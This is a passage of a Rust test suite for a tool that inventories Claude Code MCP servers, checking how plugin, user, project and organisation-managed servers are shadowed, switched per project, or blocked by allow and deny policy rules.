            }}),
        );
        let s = e.load();
        let dup2 = find(&s, Scope::Plugin, "plugin:p2:dup2");
        assert!(dup2.shadowed, "{dup2:#?}");
        assert_eq!(dup2.shadowed_in, [sa.clone(), sb.clone()]);
        // The local server is named: it is configured by hand.
        assert_eq!(plugin_info(dup2).same_as.as_deref(), Some("local-echo"));

        // And with the earlier one off in b: only the local server's project.
        e.write(
            ".claude.json",
            &json!({"projects": {
                a.to_string_lossy(): {"mcpServers": {"local-echo": {"command": "echo", "args": ["dup"]}}},
                b.to_string_lossy(): {"disabledMcpServers": ["plugin:p1:dup"]}
            }}),
        );
        let dup2 = find(&e.load(), Scope::Plugin, "plugin:p2:dup2").clone();
        assert!(!dup2.shadowed, "{dup2:#?}");
        assert_eq!(dup2.shadowed_in, [sa]);
    }

    #[test]
    fn a_projects_own_settings_switch_a_plugin_there_and_what_it_leaves_out() {
        let e = Env::new();
        let (a, b, c) = (e.project("a"), e.project("b"), e.project("c"));
        let shown = |p: &PathBuf| p.to_string_lossy().replace('\\', "/");
        e.plugin("p1", json!({"s": {"command": "one"}}));
        e.plugin("p2", json!({"t": {"command": "same"}}));
        e.plugin("p3", json!({"u": {"command": "same"}}));
        // p2 is off for the user but on in a; p1 is off in b, by its local file.
        e.write(
            "settings.json",
            &json!({"enabledPlugins": {"p1@mkt": true, "p2@mkt": false, "p3@mkt": true}}),
        );
        e.write(
            "projects/a/.claude/settings.json",
            &json!({"enabledPlugins": {"p2@mkt": true}}),
        );
        e.write(
            "projects/b/.claude/settings.local.json",
            &json!({"enabledPlugins": {"p1@mkt": false}}),
        );
        e.write(
            ".claude.json",
            &json!({"projects": {
                a.to_string_lossy(): {}, b.to_string_lossy(): {}, c.to_string_lossy(): {}
            }}),
        );
        let s = e.load();
        assert!(s.warnings.is_empty(), "{:?}", s.warnings);
        let p1 = find(&s, Scope::Plugin, "plugin:p1:s");
        assert_eq!(plugin_info(p1).off_in, [shown(&b)]);
        let p2 = find(&s, Scope::Plugin, "plugin:p2:t");
        assert_eq!(plugin_info(p2).off_in, [shown(&b), shown(&c)]);
        assert!(!p2.shadowed && p2.shadowed_in.is_empty(), "{p2:#?}");
        // In a, p2 comes first (its place in the user's file) and p3's server, the same, is left out there only.
        let p3 = find(&s, Scope::Plugin, "plugin:p3:u");
        assert!(plugin_info(p3).off_in.is_empty());
        assert!(!p3.shadowed);
        assert_eq!(p3.shadowed_in, [shown(&a)]);
        assert_eq!(plugin_info(p3).same_as.as_deref(), Some("plugin:p2:t"));

        // Off in a too: on nowhere, so not listed (like a plugin off for the user), and it leaves nothing out.
        e.write(
            "projects/a/.claude/settings.local.json",
            &json!({"enabledPlugins": {"p2@mkt": false}}),
        );
        let s = e.load();
        assert!(!s.servers.iter().any(|r| r.name == "plugin:p2:t"));
        let p3 = find(&s, Scope::Plugin, "plugin:p3:u");
        assert!(
            p3.shadowed_in.is_empty() && plugin_info(p3).same_as.is_none(),
            "{p3:#?}"
        );
    }

    #[test]
    fn a_server_left_out_only_outside_every_project_names_nothing() {
        // Cross-review of #46: "left out in 0 of 2 projects: same as plugin:p1:s" contradicted itself.
        let e = Env::new();
        let (a, b) = (e.project("a"), e.project("b"));
        let shown = |p: &PathBuf| p.to_string_lossy().replace('\\', "/");
        e.plugin("p1", json!({"s": {"command": "same"}}));
        e.plugin("p2", json!({"t": {"command": "same"}}));
        // p1 comes first, but is off in both projects: there p2's server loads.
        for p in ["a", "b"] {
            e.write(
                &format!("projects/{p}/.claude/settings.json"),
                &json!({"enabledPlugins": {"p1@mkt": false}}),
            );
        }
        e.write(
            ".claude.json",
            &json!({"projects": {a.to_string_lossy(): {}, b.to_string_lossy(): {}}}),
        );
        let s = e.load();
        let t = find(&s, Scope::Plugin, "plugin:p2:t");
        assert!(
            !t.shadowed && t.shadowed_in.is_empty() && plugin_info(t).same_as.is_none(),
            "{t:#?}"
        );

        // Variant: on again in a, so left out there, and named.
        e.write(
            "projects/a/.claude/settings.json",
            &json!({"enabledPlugins": {"p1@mkt": true}}),
        );
        let s = e.load();
        let t = find(&s, Scope::Plugin, "plugin:p2:t");
        assert!(!t.shadowed, "{t:#?}");
        assert_eq!(t.shadowed_in, [shown(&a)]);
        assert_eq!(plugin_info(t).same_as.as_deref(), Some("plugin:p1:s"));
    }

    #[test]
    fn what_could_not_be_read_of_a_plugin_is_a_cleaned_warning() {
        let e = Env::new();
        e.write(
            "settings.json",
            &json!({"enabledPlugins": {"gone\u{1b}[31m@mkt": true}}),
        );
        e.write(".claude.json", &json!({}));
        let s = e.load();
        assert_eq!(s.warnings.len(), 1, "{:?}", s.warnings);
        assert!(s.warnings[0].contains("gone"), "{:?}", s.warnings);
        assert!(!s.warnings[0].contains('\u{1b}'), "{:?}", s.warnings);
        assert!(s.servers.is_empty());
    }

    // ------------------------------------------------------------ organisation servers (decision 009)

    #[test]
    fn an_organisations_servers_are_listed_read_only_and_switched_per_project() {
        let e = Env::new();
        let (a, b) = (e.project("a"), e.project("b"));
        e.write(
            "org/managed-settings.json",
            &json!({"managedMcpServers": {"docs": {"type": "http", "url": "https://docs.example.com/mcp"}}}),
        );
        e.write(
            "org/managed-settings.d/10-run.json",
            &json!({"managedMcpServers": {"run": {"type": "stdio", "command": "node"}}}),
        );
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"mine": {"command": "mine"}},
                "projects": {
                    a.to_string_lossy(): {"disabledMcpServers": ["docs"]},
                    b.to_string_lossy(): {}
                }
            }),
        );
        let s = e.load();
        // A settings file may not name a program to run: said quietly, as only an administrator can change it, and
        // not listed.
        assert!(s.warnings.is_empty(), "{:?}", s.warnings);
        let notes = &s.organisation_notes;
        assert_eq!(notes.len(), 1, "{notes:?}");
        assert!(notes[0].contains("\"run\""), "{notes:?}");
        assert!(
            notes[0].ends_with("Your administrator can change this."),
            "{notes:?}"
        );
        assert!(!s.servers.iter().any(|r| r.name == "run"));
        let docs = find(&s, Scope::Managed, "docs");
        assert_eq!(docs.target, "https://docs.example.com/mcp");
        assert!(docs.project.is_none());
        assert_eq!((docs.enabled, docs.disabled_in), (true, 1));
        assert!(
            docs.managed
                .as_deref()
                .is_some_and(|f| f.ends_with("managed-settings.json")),
            "{docs:#?}"
        );
        assert!(docs.not_loaded.is_none());
        assert!(find(&s, Scope::User, "mine").not_loaded.is_none());
        // No file of the user's holds it: nothing can change it but the switch.
        let inv = load(&e.paths());
        assert!(!inv.keys.contains_key(&docs.connection));
    }

    #[test]
    fn an_organisations_server_replaces_a_user_or_local_server_of_the_same_name() {
        let e = Env::new();
        let a = e.project("a");
        e.write(
            "org/managed-settings.json",
            &json!({"managedMcpServers": {
                "shared": {"type": "http", "url": "https://org.example.com/mcp"},
                "loc": {"type": "http", "url": "https://loc.example.com/mcp"}
            }}),
        );
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"shared": {"command": "mine"}, "other": {"command": "other"}},
                "projects": {a.to_string_lossy(): {"mcpServers": {"loc": {"command": "loc"}}}}
            }),
        );
        let s = e.load();
        assert!(s.warnings.is_empty(), "{:?}", s.warnings);
        for (scope, name) in [(Scope::User, "shared"), (Scope::Local, "loc")] {
            let r = find(&s, scope, name);
            let why = r.not_loaded.as_deref().unwrap_or_else(|| panic!("{r:#?}"));
            assert!(why.contains("same name"), "{why}");
            assert!(why.contains("managed-settings.json"), "{why}");
        }
        assert!(find(&s, Scope::User, "other").not_loaded.is_none());
        assert!(find(&s, Scope::Managed, "shared").not_loaded.is_none());
    }

    #[test]
    fn with_managed_mcp_json_only_the_organisations_servers_load() {
        let e = Env::new();
        let a = e.project("a");
        e.plugin("p1", json!({"s": {"command": "plug"}}));
        e.write(
            "org/managed-mcp.json",
            &json!({"mcpServers": {"run": {"type": "stdio", "command": "node", "args": ["org.js"]}}}),
        );
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"mine": {"command": "mine"}},
                "projects": {a.to_string_lossy(): {"mcpServers": {"loc": {"command": "loc"}}}}
            }),
        );
        e.write(
            "projects/a/.mcp.json",
            &json!({"mcpServers": {"team": {"command": "team"}}}),
        );
        let s = e.load();
        let run = find(&s, Scope::Managed, "run");
        assert!(run.not_loaded.is_none());
        assert_eq!(run.target, "node org.js");
        for (scope, name) in [
            (Scope::User, "mine"),
            (Scope::Local, "loc"),
            (Scope::Project, "team"),
            (Scope::Plugin, "plugin:p1:s"),
        ] {
            let r = find(&s, scope, name);
            let why = r.not_loaded.as_deref().unwrap_or_else(|| panic!("{r:#?}"));
            assert!(why.contains("managed-mcp.json"), "{why}");
        }
    }

    #[test]
    fn an_organisations_server_leaves_a_plugins_server_with_the_same_address_out() {
        let e = Env::new();
        let (a, b) = (e.project("a"), e.project("b"));
        e.plugin(
            "p2",
            json!({"web2": {"type": "http", "url": "https://x.example.com/mcp"}}),
        );
        e.write(
            "org/managed-settings.json",
            &json!({"managedMcpServers": {"orgweb": {"type": "http", "url": "https://x.example.com/mcp"}}}),
        );
        e.write(
            ".claude.json",
            &json!({"projects": {a.to_string_lossy(): {}, b.to_string_lossy(): {}}}),
        );
        let s = e.load();
        let web2 = find(&s, Scope::Plugin, "plugin:p2:web2");
        assert!(web2.shadowed, "{web2:#?}");
        assert_eq!(plugin_info(web2).same_as.as_deref(), Some("orgweb"));

        // Off in one project, the organisation's server leaves it out only in the other.
        e.write(
            ".claude.json",
            &json!({"projects": {
                a.to_string_lossy(): {"disabledMcpServers": ["orgweb"]},
                b.to_string_lossy(): {}
            }}),
        );
        let s = e.load();
        let web2 = find(&s, Scope::Plugin, "plugin:p2:web2");
        assert!(!web2.shadowed, "{web2:#?}");
        assert_eq!(web2.shadowed_in, [b.to_string_lossy().replace('\\', "/")]);
        assert_eq!(plugin_info(web2).same_as.as_deref(), Some("orgweb"));
    }

    #[test]
    fn without_claude_json_the_organisations_and_plugins_servers_are_still_listed() {
        let e = Env::new();
        e.plugin("p1", json!({"s": {"command": "plug"}}));
        e.write(
            "org/managed-settings.json",
            &json!({"managedMcpServers": {"docs": {"type": "http", "url": "https://docs.example.com/mcp"}}}),
        );
        let s = e.load();
        assert!(find(&s, Scope::Managed, "docs").not_loaded.is_none());
        assert!(find(&s, Scope::Plugin, "plugin:p1:s").not_loaded.is_none());
        assert_eq!(s.warnings.len(), 1, "{:?}", s.warnings);
        assert!(s.warnings[0].contains("does not exist"), "{:?}", s.warnings);

        // A broken one still lists nothing: Claude Code's own settings are unknown then.
        e.write_raw(".claude.json", "{ broken");
        assert!(e.load().servers.is_empty());
    }

    #[test]
    fn a_server_the_organisation_replaces_leaves_no_plugin_server_out() {
        let e = Env::new();
        e.plugin("p1", json!({"s": {"command": "same"}}));
        e.write(
            "org/managed-settings.json",
            &json!({"managedMcpServers": {"mine": {"type": "http", "url": "https://org.example.com/mcp"}}}),
        );
        e.write(
            ".claude.json",
            &json!({"mcpServers": {"mine": {"command": "same"}}}),
        );
        let s = e.load();
        // Claude Code loads the organisation's "mine", not the user's, so nothing has the plugin's command.
        let p = find(&s, Scope::Plugin, "plugin:p1:s");
        assert!(!p.shadowed && plugin_info(p).same_as.is_none(), "{p:#?}");
    }

    // ------------------------------------------------------------ policy (decision 010)

    fn blocked_why(r: &ServerRow) -> &str {
        r.not_loaded
            .as_deref()
            .unwrap_or_else(|| panic!("not loaded: {r:#?}"))
    }

    #[test]
    fn a_server_a_rule_blocks_everywhere_is_not_loaded_and_says_which_rule() {
        let e = Env::new();
        let a = e.project("a");
        e.write(
            "settings.json",
            &json!({"deniedMcpServers": [{"serverName": "x"}, {"serverCommand": ["loc"]}]}),
        );
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"x": {"command": "x"}, "ok": {"command": "ok"}},
                "projects": {a.to_string_lossy(): {"mcpServers": {"l": {"command": "loc"}}}}
            }),
        );
        let s = e.load();
        assert!(s.warnings.is_empty(), "{:?}", s.warnings);
        let why = blocked_why(find(&s, Scope::User, "x"));
        assert!(
            why.starts_with("Blocked by policy") && why.contains("serverName \"x\""),
            "{why}"
        );
        assert!(why.contains("settings.json"), "{why}");
        let why = blocked_why(find(&s, Scope::Local, "l"));
        assert!(why.contains("serverCommand [\"loc\"]"), "{why}");
        let ok = find(&s, Scope::User, "ok");
        assert!(ok.not_loaded.is_none() && ok.blocked.is_none(), "{ok:#?}");
    }

    #[test]
    fn a_projects_own_rules_block_a_user_server_there_only() {
        let e = Env::new();
        let (a, b) = (e.project("a"), e.project("b"));
        let shown = |p: &PathBuf| p.to_string_lossy().replace('\\', "/");
        e.write(
            "projects/a/.claude/settings.local.json",
            &json!({"deniedMcpServers": [{"serverName": "x"}]}),
        );
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"x": {"command": "x"}},
                "projects": {a.to_string_lossy(): {}, b.to_string_lossy(): {}}
            }),
        );
        let s = e.load();
        let x = find(&s, Scope::User, "x");
        assert!(x.not_loaded.is_none(), "{x:#?}");
        let blocked = x.blocked.as_ref().unwrap_or_else(|| panic!("{x:#?}"));
        assert_eq!(blocked.projects, [shown(&a)]);
        assert!(
            blocked.why.contains("settings.local.json"),
            "{}",
            blocked.why
        );

        // Variant: blocked in both, so in every project: not loaded.
        e.write(
            "projects/b/.claude/settings.json",
            &json!({"deniedMcpServers": [{"serverName": "x"}]}),
        );
        let s = e.load();
        let x = find(&s, Scope::User, "x");
        assert!(x.blocked.is_none(), "{x:#?}");
        assert!(blocked_why(x).contains("Blocked by policy"));
    }

    #[test]
    fn a_blocked_local_server_still_takes_the_users_name() {
        // Names merge first: the user's x does not come back where the local x is blocked.
        let e = Env::new();
        let a = e.project("a");
        let shown = |p: &PathBuf| p.to_string_lossy().replace('\\', "/");
        e.write(
            "settings.json",
            &json!({"deniedMcpServers": [{"serverCommand": ["localx"]}]}),
        );
        e.write(
            ".claude.json",
            &json!({
                "mcpServers": {"x": {"command": "userx"}},
                "projects": {a.to_string_lossy(): {"mcpServers": {"x": {"command": "localx"}}}}
            }),
        );
        let s = e.load();
        assert!(blocked_why(find(&s, Scope::Local, "x")).contains("localx"));
        let user = find(&s, Scope::User, "x");
        assert_eq!(user.shadowed_in, [shown(&a)]);
        assert!(
            user.not_loaded.is_none() && user.blocked.is_none(),
            "{user:#?}"
        );
    }

    #[test]
    fn a_blocked_server_leaves_no_plugin_server_out_and_a_plugins_is_blocked_by_its_full_name() {
        let e = Env::new();
        e.plugin(
            "p1",
            json!({"s": {"command": "same"}, "t": {"command": "t"}}),
        );
        e.write(
            ".claude.json",
            &json!({"mcpServers": {"hand": {"command": "same"}}}),
        );
        let mut settings: Value = serde_json::from_str(
            &std::fs::read_to_string(e.dir.path().join("settings.json")).unwrap(),
        )
        .unwrap();
        settings["deniedMcpServers"] =
            json!([{"serverName": "hand"}, {"serverName": "plugin:p1:t"}]);
        e.write("settings.json", &settings);
        let s = e.load();
        let p = find(&s, Scope::Plugin, "plugin:p1:s");
        assert!(!p.shadowed && plugin_info(p).same_as.is_none(), "{p:#?}");
        assert!(blocked_why(find(&s, Scope::Plugin, "plugin:p1:t")).contains("plugin:p1:t"));
    }

    #[test]
    fn an_allowed_list_holds_back_the_users_servers_but_not_the_organisations() {
        let e = Env::new();
        e.write(
            "settings.json",
            &json!({"allowedMcpServers": [{"serverName": "ok"}]}),
        );
        e.write(
            "org/managed-settings.json",
            &json!({"managedMcpServers": {
                "docs": {"type": "http", "url": "https://docs.example.com/mcp"},
                "gone": {"type": "http", "url": "https://gone.example.com/mcp"}
            }, "deniedMcpServers": [{"serverUrl": "https://gone.example.com/*"}]}),
        );
        e.write(
            ".claude.json",
            &json!({"mcpServers": {"ok": {"command": "ok"}, "no": {"command": "no"}}}),
        );
        let s = e.load();
        assert!(find(&s, Scope::User, "ok").not_loaded.is_none());
        assert!(blocked_why(find(&s, Scope::User, "no")).contains("allowedMcpServers"));
        assert!(find(&s, Scope::Managed, "docs").not_loaded.is_none());
        assert!(blocked_why(find(&s, Scope::Managed, "gone")).contains("serverUrl"));
    }
}
